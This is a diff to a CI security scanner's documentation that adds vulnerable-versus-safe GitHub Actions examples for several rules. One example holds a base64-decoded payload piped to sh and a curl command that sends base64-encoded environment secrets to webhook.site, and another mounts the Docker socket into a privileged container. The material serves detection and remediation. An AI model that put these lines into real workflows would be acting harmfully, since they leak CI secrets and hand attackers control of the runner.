@@ -2898,6 +2898,36 @@ steps:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket runs inside a GitHub-hosted (or self-
+# hosted) runner. The container escapes to the runner;
+# on self-hosted runners that's persistent compromise.
+name: integration
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          docker run --privileged \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. Use
+# a rootless builder (Kaniko, BuildKit rootless) if the
+# job needs to build images. Pin the image to a digest.
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: docker run myapp@sha256:abc123... ./integration.sh
+```
+
 **Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }
@@ -3095,6 +3125,34 @@ jobs:
 - Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious PR (or compromised co-
+# maintainer) lands the payload in a workflow file;
+# every subsequent run executes it.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the workflow does only what the workflow does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: make build
+```
+
 **Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }
@@ -3204,6 +3262,39 @@ jobs:
 **Seen in the wild.**
 
 - GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``uses: rando-user/single-maintainer-action``
+# is a low-star action from a single-maintainer repo,
+# AND the calling job grants ``contents: write`` /
+# ``id-token: write`` / similar. A compromised maintainer
+# (or a typosquat / namespace takeover) ships code into
+# the runner with write access to the repo.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: rando-user/auto-release@<sha>   # 4 stars, 1 maintainer
+
+# Safe: vet the action's reputation before granting
+# sensitive permissions. Prefer first-party / verified-
+# creator actions for privileged jobs. If a niche action
+# is truly required, fork it into your own org, vendor
+# the maintained version, and pin to your fork's SHA.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: softprops/action-gh-release@<sha>   # verified-creator equivalent
+```
 
 **Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).
 
